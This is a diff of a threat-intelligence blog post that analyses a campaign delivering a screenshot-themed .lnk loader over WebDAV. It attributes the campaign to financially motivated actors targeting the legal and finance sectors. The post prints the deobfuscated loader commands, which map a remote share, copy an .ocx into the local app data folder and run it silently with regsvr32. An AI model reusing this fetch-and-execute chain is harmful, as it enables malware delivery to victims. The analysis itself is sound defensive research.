@@ -118,9 +118,9 @@ WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients 
 
 ## The Attack
 
-Using URLScan.io, I discovered a loader file `Screenshot_2026_04_20.lnk` available on all attacker domains. The loader link file contains obfuscated instruction code. Pivoting to Triage from within URLScan.io, I downloaded the screenshot loader and deobfuscated the code. 
+Using URLScan.io, I discovered a loader file `Screenshot_2026_04_20.lnk` available on all attacker domains. The loader link file contains obfuscated instruction code. Pivoting to Triage.de from within URLScan.io, I downloaded the screenshot loader file and deobfuscated the code. 
 
-```Loader
+````
 net use \\70.34.205[.]43@8080\cloud\
 copy \\70.34.205[.]43@8080\cloud\updater.ocx %localappdata%\Packages\9892719795172581714.ocx.ocx
 start /b regsvr32 /s /i \\70.34.205[.]43@8080\cloud\updater.ocx
@@ -137,7 +137,7 @@ Let's break down the loader commands.
 6. The `/s` tells regsvr32 to run silently
 
 ## Analysis Gap
-It is unclear how the screenshot loader makes it to the victims desktop. It's possible the user is phished or is victim to a clickfix attack. Additionally, I'm unsure of what the Credentials.txt file contains. 
+It is unclear how the screenshot loader makes it to the victims desktop. It's possible the attacker ran a phishing campaign or the victim falls victim to a clickfix attack. Additionally, I'm unsure of what the Credentials.txt file contains. 
 
 ## Command and Control
 
@@ -158,7 +158,7 @@ In our previous post, we found the threat actors intended initial steps post-exp
 | Discovery | Network Service Discovery | `T1046` |
 | Lateral Movement | Remote Services | `T1021` |
 
-The campaign activity ranges from March to April 2026. Infrastructure domain names incorporating payment and legal services suggest deliberate targeting of financial and legal sectors. Based on the post-exploitation capabilities observed in the sample, the operator's likely objective is credential harvesting and financial gain. Further OSINT investigation reveals screenly[.]cam hosting a financial invoice request for $69,000 EUR. The overall profile is consistent with a financially motivated threat actor.
+The attackers campaign activity was seen active between March to April 2026. Infrastructure domain names incorporate payment and legal services suggesting deliberate targeting of financial and legal sectors. Based on post-exploitation capabilities observed in the malware, the operator's likely objective is credential harvesting and financial gain. Further OSINT investigation reveals screenly[.]cam hosting a financial invoice request for $69,000 EUR. The overall profile is consistent with a financially motivated threat actor.
 
 <img src="/assets/images/posts/2026-05-21-runner-threat-intel/fraud.png" alt="fraud" width="800">
 
